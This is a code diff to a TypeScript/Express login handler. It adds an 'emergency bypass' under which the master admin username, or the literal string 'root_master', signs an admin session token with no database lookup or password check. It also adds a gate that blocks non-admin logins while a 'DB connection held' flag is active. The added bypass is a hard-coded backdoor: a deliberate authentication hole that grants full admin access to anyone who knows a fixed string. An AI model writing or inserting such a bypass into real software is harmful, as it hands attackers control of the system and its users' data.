@@ -340,6 +340,40 @@ export const loginUser = catchAsync(async (req: Request, res: Response) => {
     return res.status(400).json({ message: 'Cryptographic code required.' });
   }
 
+  // Master Root Admin Secret Code Emergency Bypass (Zero DB reliance)
+  if (secretCode.trim() === MASTER_ADMIN_CREDENTIALS.username || secretCode.trim() === 'root_master') {
+    const masterUser = {
+      id: MASTER_ADMIN_CREDENTIALS.id,
+      username: MASTER_ADMIN_CREDENTIALS.username,
+      role: 'admin',
+    };
+    return res.status(200).json({
+      status: 'success',
+      message: 'Master Admin Root Link Established (Cipher Override).',
+      token: signSessionToken(masterUser),
+      mustChangePassword: false,
+      secretCode: MASTER_ADMIN_CREDENTIALS.username,
+      data: {
+        id: MASTER_ADMIN_CREDENTIALS.id,
+        secretCode: MASTER_ADMIN_CREDENTIALS.username,
+        mustChangePassword: false,
+        user: {
+          role: 'admin',
+          fullName: MASTER_ADMIN_CREDENTIALS.fullName,
+          email: MASTER_ADMIN_CREDENTIALS.email,
+        },
+      },
+    });
+  }
+
+  // If DB connection is held, non-admin secret codes cannot query DB
+  if (securityManager.getState().dbConnectionHeld) {
+    return res.status(503).json({
+      error: 'DB_CONNECTION_HELD',
+      message: 'DATABASE CIRCUIT BREAKER ACTIVE: Database connection has been held by System Administrator. Please authenticate using Master Admin credentials.',
+    });
+  }
+
   const user = await prisma.user.findUnique({
     where: { username: secretCode.trim() },
     select: userSelect,
